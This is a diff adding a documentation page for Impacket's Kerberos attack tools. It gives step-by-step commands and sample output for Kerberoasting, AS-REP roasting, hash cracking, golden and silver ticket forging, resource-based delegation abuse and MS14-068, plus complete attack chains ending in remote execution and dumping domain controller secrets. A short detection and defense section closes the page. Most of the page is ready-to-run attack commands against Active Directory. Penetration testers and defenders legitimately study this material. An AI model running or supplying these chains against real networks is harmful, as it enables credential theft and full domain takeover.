@@ -1,0 +1,593 @@
+---
+title: "Kerberos Attack Tools"
+description: "Kerberoasting, AS-REP roasting, ticket manipulation, and Kerberos exploits"
+---
+
+Impacket provides comprehensive tools for attacking and manipulating Kerberos authentication in Active Directory environments.
+
+## Attack Overview
+
+<CardGroup cols={2}>
+  <Card title="Kerberoasting" icon="ticket">
+    Request service tickets for offline password cracking
+  </Card>
+  <Card title="AS-REP Roasting" icon="unlock">
+    Extract hashes from accounts without pre-authentication
+  </Card>
+  <Card title="Ticket Manipulation" icon="wand-magic-sparkles">
+    Forge Golden/Silver tickets and convert formats
+  </Card>
+  <Card title="Delegation Attacks" icon="arrow-right-arrow-left">
+    Exploit unconstrained and constrained delegation
+  </Card>
+</CardGroup>
+
+## GetUserSPNs.py (Kerberoasting)
+
+Finds user accounts with Service Principal Names (SPNs) and requests TGS tickets for offline cracking.
+
+### Basic Usage
+
+<Tabs>
+  <Tab title="Enumerate SPNs">
+    ```bash
+    # List all user accounts with SPNs
+    GetUserSPNs.py DOMAIN/user:password@DC_IP
+    
+    # With NTLM hash
+    GetUserSPNs.py DOMAIN/user@DC -hashes LMHASH:NTHASH
+    
+    # Kerberos authentication
+    GetUserSPNs.py DOMAIN/user@DC -k -no-pass -dc-ip DC_IP
+    ```
+  </Tab>
+  <Tab title="Request TGS">
+    ```bash
+    # Request TGS tickets and output hashes
+    GetUserSPNs.py DOMAIN/user:password@DC -request
+    
+    # Save to file for cracking
+    GetUserSPNs.py DOMAIN/user:pass@DC -request -outputfile kerberoast.txt
+    
+    # Request for specific user
+    GetUserSPNs.py DOMAIN/user:pass@DC -request-user serviceaccount
+    ```
+  </Tab>
+  <Tab title="Save Tickets">
+    ```bash
+    # Request and save tickets in .ccache format
+    GetUserSPNs.py DOMAIN/user:pass@DC -request -save
+    
+    # This creates files like:
+    # serviceaccount.ccache
+    # mssql-svc.ccache
+    ```
+  </Tab>
+</Tabs>
+
+### Advanced Options
+
+<AccordionGroup>
+  <Accordion title="Filtering & Targeting">
+    ```bash
+    # Target specific user
+    GetUserSPNs.py domain/user:pass@dc -request-user sql_service
+    
+    # From file of usernames
+    GetUserSPNs.py domain/user:pass@dc -usersfile users.txt -request
+    
+    # Stealth mode (no TGS requests, just enumerate)
+    GetUserSPNs.py domain/user:pass@dc -stealth
+    ```
+  </Accordion>
+  <Accordion title="Machine Accounts">
+    ```bash
+    # Only show machine accounts with SPNs
+    GetUserSPNs.py domain/user:pass@dc -machine-only
+    
+    # Request TGS for machine accounts
+    GetUserSPNs.py domain/user:pass@dc -request-machine
+    ```
+  </Accordion>
+  <Accordion title="Cross-Domain">
+    ```bash
+    # Specify target domain (cross-domain kerberoasting)
+    GetUserSPNs.py user:pass@dc -target-domain TARGET.DOMAIN.COM
+    
+    # With DC hostname
+    GetUserSPNs.py user:pass -dc-host DC.TARGET.COM -dc-ip 10.0.0.1
+    ```
+  </Accordion>
+</AccordionGroup>
+
+### Example Output
+
+<CodeGroup>
+```bash Enumeration
+$ GetUserSPNs.py CORP/jdoe:P@ssw0rd@10.0.0.1
+Impacket v0.12.0 - Copyright 2023 Fortra
+
+ServicePrincipalName              Name        MemberOf                                    PasswordLastSet             LastLogon  Delegation
+--------------------------------  ----------  ------------------------------------------  --------------------------  ---------  ----------
+MSSQLSvc/sql01.corp.local:1433    sql_svc     CN=Domain Admins,CN=Users,DC=corp,DC=local  2023-01-15 10:30:22.123456  <never>               
+HTTP/web01.corp.local             iis_svc     CN=WebAdmins,CN=Users,DC=corp,DC=local      2023-03-20 14:15:00.654321  <never>               
+```
+
+```bash TGS Request (John format)
+$ GetUserSPNs.py CORP/jdoe:P@ssw0rd@10.0.0.1 -request
+Impacket v0.12.0 - Copyright 2023 Fortra
+
+$krb5tgs$23$*sql_svc$CORP.LOCAL$MSSQLSvc/sql01.corp.local~1433*$a1b2c3d4e5f6...
+$krb5tgs$23$*iis_svc$CORP.LOCAL$HTTP/web01.corp.local*$f6e5d4c3b2a1...
+```
+
+```bash Hashcat format
+$ GetUserSPNs.py CORP/jdoe:pass@10.0.0.1 -request -format hashcat
+$krb5tgs$23$*sql_svc$CORP.LOCAL$MSSQLSvc/sql01.corp.local~1433*$hash...
+```
+</CodeGroup>
+
+### Cracking Kerberoast Hashes
+
+<Tabs>
+  <Tab title="John the Ripper">
+    ```bash
+    # Crack with wordlist
+    john --wordlist=rockyou.txt kerberoast.txt
+    
+    # With rules
+    john --wordlist=wordlist.txt --rules kerberoast.txt
+    
+    # Show cracked passwords
+    john --show kerberoast.txt
+    ```
+  </Tab>
+  <Tab title="Hashcat">
+    ```bash
+    # Kerberos TGS-REP (Type 23)
+    hashcat -m 13100 kerberoast.txt rockyou.txt
+    
+    # With rules
+    hashcat -m 13100 kerberoast.txt wordlist.txt -r best64.rule
+    
+    # AES256 tickets (Type 18)
+    hashcat -m 19700 kerberoast_aes.txt wordlist.txt
+    ```
+  </Tab>
+  <Tab title="Usage">
+    ```bash
+    # After cracking, use the password
+    psexec.py CORP/sql_svc:CrackedPassword@target
+    
+    # Or get hash and pass-the-hash
+    python3 -c "import hashlib; print(hashlib.new('md4', 'CrackedPassword'.encode('utf-16le')).hexdigest())"
+    psexec.py CORP/sql_svc@target -hashes :NTHASH
+    ```
+  </Tab>
+</Tabs>
+
+## GetNPUsers.py (AS-REP Roasting)
+
+Extracts crackable hashes from accounts with "Do not require Kerberos preauthentication" enabled.
+
+### Basic Usage
+
+<Tabs>
+  <Tab title="Authenticated">
+    ```bash
+    # Enumerate and request AS-REP for vulnerable users
+    GetNPUsers.py DOMAIN/user:password@DC_IP
+    
+    # With NTLM hash
+    GetNPUsers.py DOMAIN/user@DC -hashes LMHASH:NTHASH
+    
+    # Request and save to file
+    GetNPUsers.py DOMAIN/user:pass@DC -request -outputfile asrep.txt
+    ```
+  </Tab>
+  <Tab title="Unauthenticated">
+    ```bash
+    # No credentials needed if you have a username list
+    GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat
+    
+    # This works because AS-REP roasting doesn't require authentication!
+    GetNPUsers.py DOMAIN/ -usersfile usernames.txt -dc-ip 10.0.0.1
+    ```
+  </Tab>
+  <Tab title="Output Formats">
+    ```bash
+    # John the Ripper format (default)
+    GetNPUsers.py domain/user:pass@dc -request -format john
+    
+    # Hashcat format
+    GetNPUsers.py domain/user:pass@dc -request -format hashcat
+    
+    # Save to file
+    GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC -outputfile hashes.txt
+    ```
+  </Tab>
+</Tabs>
+
+### Example Output
+
+```bash
+$ GetNPUsers.py CORP/ -usersfile users.txt -dc-ip 10.0.0.1
+Impacket v0.12.0 - Copyright 2023 Fortra
+
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User jdoe doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$vulnerable_user@CORP.LOCAL:a1b2c3d4e5f6789012345678901234$abcdef...
+[-] User service_account doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+
+### Cracking AS-REP Hashes
+
+<Tabs>
+  <Tab title="John the Ripper">
+    ```bash
+    john --wordlist=rockyou.txt asrep.txt
+    john --show asrep.txt
+    ```
+  </Tab>
+  <Tab title="Hashcat">
+    ```bash
+    # AS-REP Type 23 (RC4)
+    hashcat -m 18200 asrep.txt rockyou.txt
+    
+    # AS-REP Type 17/18 (AES)
+    hashcat -m 19600 asrep_aes.txt wordlist.txt
+    ```
+  </Tab>
+</Tabs>
+
+## Ticket Manipulation Tools
+
+### getTGT.py
+
+Request Ticket Granting Tickets (TGT) with credentials.
+
+```bash
+# Get TGT with password
+getTGT.py DOMAIN/user:password -dc-ip DC_IP
+
+# With NTLM hash
+getTGT.py DOMAIN/user -hashes :NTHASH -dc-ip DC_IP
+
+# With AES key
+getTGT.py DOMAIN/user -aesKey AES256_KEY -dc-ip DC_IP
+
+# Output saved as user.ccache
+export KRB5CCNAME=user.ccache
+psexec.py DOMAIN/user@target -k -no-pass
+```
+
+### getST.py
+
+Request Service Tickets (TGS) for specific services.
+
+<Tabs>
+  <Tab title="Basic TGS Request">
+    ```bash
+    # Request service ticket
+    getST.py DOMAIN/user:password -spn cifs/target.domain.local -dc-ip DC_IP
+    
+    # With TGT
+    export KRB5CCNAME=user.ccache
+    getST.py DOMAIN/user -spn cifs/target.domain.local -k -no-pass
+    ```
+  </Tab>
+  <Tab title="Impersonation (S4U2Self)">
+    ```bash
+    # Impersonate another user (requires delegation rights)
+    getST.py DOMAIN/serviceaccount:password -spn cifs/target.domain.local \
+      -impersonate Administrator -dc-ip DC_IP
+    
+    # Use the ticket
+    export KRB5CCNAME=Administrator.ccache
+    psexec.py DOMAIN/Administrator@target -k -no-pass
+    ```
+  </Tab>
+  <Tab title="Delegation Attacks">
+    ```bash
+    # S4U2Proxy attack (constrained delegation)
+    getST.py DOMAIN/service:pass -spn cifs/target.domain.local \
+      -impersonate Administrator -dc-ip DC_IP
+    
+    # Additional service ticket
+    getST.py DOMAIN/service:pass -spn http/target.domain.local \
+      -additional-ticket cifs.ccache -dc-ip DC_IP
+    ```
+  </Tab>
+</Tabs>
+
+### ticketer.py
+
+Forge Kerberos tickets (Golden Ticket, Silver Ticket).
+
+<Tabs>
+  <Tab title="Golden Ticket">
+    ```bash
+    # Create Golden Ticket (requires krbtgt hash from secretsdump)
+    ticketer.py -nthash KRBTGT_NTHASH -domain-sid S-1-5-21-... \
+      -domain DOMAIN.LOCAL Administrator
+    
+    # With AES key (better)
+    ticketer.py -aesKey AES256_KEY -domain-sid S-1-5-21-... \
+      -domain DOMAIN.LOCAL Administrator
+    
+    # Use the ticket
+    export KRB5CCNAME=Administrator.ccache
+    psexec.py DOMAIN/Administrator@dc.domain.local -k -no-pass
+    ```
+  </Tab>
+  <Tab title="Silver Ticket">
+    ```bash
+    # Create Silver Ticket (requires service account hash)
+    ticketer.py -nthash SERVICE_NTHASH -domain-sid S-1-5-21-... \
+      -domain DOMAIN.LOCAL -spn cifs/target.domain.local Administrator
+    
+    # Use for specific service
+    export KRB5CCNAME=Administrator.ccache
+    smbclient.py DOMAIN/Administrator@target.domain.local -k -no-pass
+    ```
+  </Tab>
+  <Tab title="Advanced Options">
+    ```bash
+    # Custom user ID and groups
+    ticketer.py -nthash HASH -domain-sid SID -domain DOMAIN \
+      -user-id 500 -groups 512,513,518,519,520 Administrator
+    
+    # Extra SIDs (SID History injection)
+    ticketer.py -nthash HASH -domain-sid SID -domain DOMAIN \
+      -extra-sid S-1-5-21-...-519 Administrator
+    
+    # Custom duration
+    ticketer.py -nthash HASH -domain-sid SID -domain DOMAIN \
+      -duration 3650 Administrator  # 10 years
+    ```
+  </Tab>
+</Tabs>
+
+### ticketConverter.py
+
+Convert tickets between .ccache and .kirbi formats.
+
+```bash
+# Kirbi to CCache (Mimikatz to Impacket)
+ticketConverter.py ticket.kirbi ticket.ccache
+
+# CCache to Kirbi (Impacket to Mimikatz)
+ticketConverter.py ticket.ccache ticket.kirbi
+
+# Use converted ticket
+export KRB5CCNAME=ticket.ccache
+psexec.py DOMAIN/user@target -k -no-pass
+```
+
+### describeTicket.py
+
+Analyze and display ticket contents.
+
+```bash
+# Describe ccache ticket
+describeTicket.py ticket.ccache
+
+# Describe kirbi ticket
+describeTicket.py ticket.kirbi
+```
+
+## Delegation Attack Tools
+
+### findDelegation.py
+
+Find accounts with delegation configured.
+
+```bash
+# Find all delegation configurations
+findDelegation.py DOMAIN/user:password@DC_IP
+
+# Output shows:
+# - Unconstrained delegation
+# - Constrained delegation
+# - Resource-based constrained delegation (RBCD)
+```
+
+### rbcd.py
+
+Manage Resource-Based Constrained Delegation (RBCD).
+
+<Tabs>
+  <Tab title="Read RBCD">
+    ```bash
+    # Read current RBCD configuration
+    rbcd.py DOMAIN/user:password@DC -delegate-to TARGET$ -action read
+    ```
+  </Tab>
+  <Tab title="Write RBCD">
+    ```bash
+    # Configure RBCD (allow ATTACKER$ to impersonate to TARGET$)
+    rbcd.py DOMAIN/user:password@DC -delegate-from ATTACKER$ \
+      -delegate-to TARGET$ -action write
+    
+    # Then impersonate with getST.py
+    getST.py DOMAIN/ATTACKER$ -spn cifs/TARGET.domain.local \
+      -impersonate Administrator -hashes :ATTACKER_HASH
+    ```
+  </Tab>
+  <Tab title="Remove RBCD">
+    ```bash
+    # Remove RBCD configuration
+    rbcd.py DOMAIN/user:password@DC -delegate-from ATTACKER$ \
+      -delegate-to TARGET$ -action remove
+    ```
+  </Tab>
+</Tabs>
+
+### addcomputer.py
+
+Add computer accounts to the domain (for RBCD attacks).
+
+```bash
+# Add computer account
+addcomputer.py DOMAIN/user:password@DC -computer-name ATTACKER$ \
+  -computer-pass P@ssw0rd123!
+
+# Delete computer account
+addcomputer.py DOMAIN/user:password@DC -computer-name ATTACKER$ -delete
+
+# Use LDAPS method
+addcomputer.py DOMAIN/user:password@DC -computer-name ATTACKER$ \
+  -computer-pass P@ssw0rd -method LDAPS
+```
+
+## Advanced Kerberos Attacks
+
+### goldenPac.py
+
+Exploit MS14-068 Kerberos vulnerability.
+
+```bash
+# Exploit MS14-068 (patched systems)
+goldenPac.py DOMAIN/user:password@target
+
+# With hash
+goldenPac.py DOMAIN/user@target -hashes LMHASH:NTHASH
+```
+
+### raiseChild.py
+
+Automate child-to-parent domain privilege escalation.
+
+```bash
+# Escalate from child to parent domain
+raiseChild.py CHILD.PARENT.LOCAL/Administrator:password@DC_IP
+
+# With hash
+raiseChild.py CHILD.PARENT.LOCAL/Administrator@DC -hashes :NTHASH
+```
+
+### getPac.py
+
+Retrieve and decrypt Privilege Attribute Certificate (PAC).
+
+```bash
+# Get PAC information
+getPac.py DOMAIN/user:password@target -target-user Administrator
+```
+
+## Complete Attack Chain Examples
+
+<Tabs>
+  <Tab title="Kerberoasting Chain">
+    ```bash
+    # 1. Enumerate SPNs
+    GetUserSPNs.py CORP/user:pass@10.0.0.1
+    
+    # 2. Request TGS tickets
+    GetUserSPNs.py CORP/user:pass@10.0.0.1 -request -outputfile hashes.txt
+    
+    # 3. Crack hashes
+    hashcat -m 13100 hashes.txt rockyou.txt
+    
+    # 4. Use cracked password
+    psexec.py CORP/sql_svc:CrackedPass123@sql-server.corp.local
+    ```
+  </Tab>
+  <Tab title="RBCD Attack Chain">
+    ```bash
+    # 1. Add computer account (requires write permissions)
+    addcomputer.py CORP/user:pass@dc -computer-name EVIL$ -computer-pass P@ss
+    
+    # 2. Configure RBCD on target
+    rbcd.py CORP/user:pass@dc -delegate-from EVIL$ -delegate-to TARGET$ -action write
+    
+    # 3. Request TGT for our computer
+    getTGT.py CORP/EVIL$:P@ss -dc-ip 10.0.0.1
+    
+    # 4. Impersonate Administrator
+    export KRB5CCNAME=EVIL\$.ccache
+    getST.py CORP/EVIL$ -spn cifs/TARGET.corp.local -impersonate Administrator -k -no-pass
+    
+    # 5. Use ticket
+    export KRB5CCNAME=Administrator.ccache
+    psexec.py CORP/Administrator@TARGET.corp.local -k -no-pass
+    ```
+  </Tab>
+  <Tab title="Golden Ticket Chain">
+    ```bash
+    # 1. Dump krbtgt hash (requires DA or DC compromise)
+    secretsdump.py CORP/DA:pass@dc -just-dc-user krbtgt
+    
+    # 2. Get domain SID
+    # From secretsdump output or:
+    lookupsid.py CORP/user:pass@dc
+    
+    # 3. Create Golden Ticket
+    ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... \
+      -domain CORP.LOCAL FakeAdmin
+    
+    # 4. Use ticket for any system in domain
+    export KRB5CCNAME=FakeAdmin.ccache
+    psexec.py CORP/FakeAdmin@dc.corp.local -k -no-pass
+    secretsdump.py CORP/FakeAdmin@dc.corp.local -k -no-pass -just-dc
+    ```
+  </Tab>
+</Tabs>
+
+## Detection & Defense
+
+<Warning>
+  Kerberos attacks are often detected by modern security tools. Understanding detection mechanisms is crucial.
+</Warning>
+
+### Detection Indicators
+
+<AccordionGroup>
+  <Accordion title="Kerberoasting">
+    - **Event ID 4769**: TGS requests for user accounts (unusual encryption type RC4)
+    - **Event ID 4768**: TGT requests from unusual locations
+    - High volume of TGS requests
+    - TGS requests for dormant accounts
+  </Accordion>
+  <Accordion title="AS-REP Roasting">
+    - **Event ID 4768**: AS-REQ without pre-authentication
+    - Multiple AS-REQ failures from single source
+    - Unusual user account queries
+  </Accordion>
+  <Accordion title="Golden/Silver Tickets">
+    - Tickets with unusual lifetime (10+ years)
+    - Tickets created outside normal KDC
+    - **Event ID 4624**: Logons with tickets showing anomalies
+    - Tickets with missing or invalid PAC validation info
+  </Accordion>
+  <Accordion title="Delegation Attacks">
+    - **Event ID 4662**: Changes to msDS-AllowedToActOnBehalfOfOtherIdentity
+    - **Event ID 4741/4742**: Computer account creation/modification
+    - Unusual S4U2Self/S4U2Proxy requests
+  </Accordion>
+</AccordionGroup>
+
+### Defensive Measures
+
+- Use strong, long passwords for service accounts (25+ characters)
+- Enable AES encryption for Kerberos (disable RC4)
+- Monitor for accounts with "Do not require preauth" flag
+- Implement Service Account password rotation
+- Use Group Managed Service Accounts (gMSA)
+- Enable PAC validation
+- Monitor delegation configurations
+- Restrict SPN registration permissions
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="Credential Dumping" icon="key" href="/examples/credential-dumping">
+    Extract credentials for Kerberos attacks
+  </Card>
+  <Card title="LDAP Operations" icon="sitemap" href="/examples/ldap-operations">
+    Enumerate delegation and SPNs via LDAP
+  </Card>
+  <Card title="Remote Execution" icon="terminal" href="/examples/remote-execution">
+    Use Kerberos tickets for remote execution
+  </Card>
+</CardGroup>
